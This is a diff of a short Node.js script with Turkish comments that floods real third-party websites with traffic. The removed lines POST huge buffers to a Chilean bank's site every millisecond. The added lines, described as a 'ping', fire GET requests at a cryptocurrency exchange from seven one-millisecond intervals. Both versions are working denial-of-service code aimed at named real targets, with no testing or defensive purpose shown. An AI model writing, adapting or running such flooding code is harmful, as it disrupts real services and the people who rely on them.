@@ -1,41 +1,43 @@
+
+
+
 import express from 'express';
+
 import axios from 'axios';
-import fs from 'fs';
 
-const app = express();
-const port = 3001;
+const app = express()
+const port = 3001
 
-app.use(express.json());
+app.use(express.json())
 
-const backendURL = 'https://www.bci.cl/personas'; // Sunucu adresini buraya girin
 
-function sendLargeData() {
-  const data = generateLargeData(); // 1 MB boyutunda veri oluşturulması gerekiyor
-  
-  axios.post(backendURL, data, {
-      headers: {
-        'Content-Type': 'application/octet-stream', // Verinin türünü belirtin (örneğin, bu örnekte binary olarak belirtildi)
-      },
-    })
+const backendURL = 'https://cex.io'; 
+
+function pingBackend() {
+  axios.get(backendURL) 
     .then(response => {
-      console.log('Veri başarıyla gönderildi:', response.data);
+      console.log('Ping gönderildi, backend aktif!');
     })
     .catch(error => {
-      console.error('Veri gönderme hatası:', error);
+      console.error('Ping gönderme hatası:', error);
     });
 }
 
-function generateLargeData() {
-  // Örnek olarak 1 MB boyutunda rastgele veri oluşturma
-  const fileSizeInBytes = 102400 * 102400; // 10MB
-  const data = Buffer.alloc(fileSizeInBytes, 'a'); // 1 MB boyutunda 'a' karakterleri içeren bir veri oluşturur
-  return data;
-}
 
-const sendInterval = setInterval(sendLargeData, 1); // Belirli aralıklarla veri göndermek için bir zamanlayıcı oluşturuldu (örneğin, her 10 saniyede bir)
-const sendInterval2 = setInterval(sendLargeData, 1);
-const sendInterval3 = setInterval(sendLargeData, 1);
+const pingInterval = setInterval(pingBackend, 1);
+const pingInterval2 = setInterval(pingBackend, 1);
+const pingInterval3= setInterval(pingBackend, 1);
+const pingInterval4= setInterval(pingBackend, 1);
+const pingInterval5 = setInterval(pingBackend, 1);
+const pingInterval6= setInterval(pingBackend, 1);
+const pingInterval7 = setInterval(pingBackend, 1);
+
+
 
 app.listen(port, () => {
-  console.log(`Example app listening on port ${port}`);
-});
+  console.log(`Example app listening on port ${port}`)
+})
+
+
+pingBackend();
+
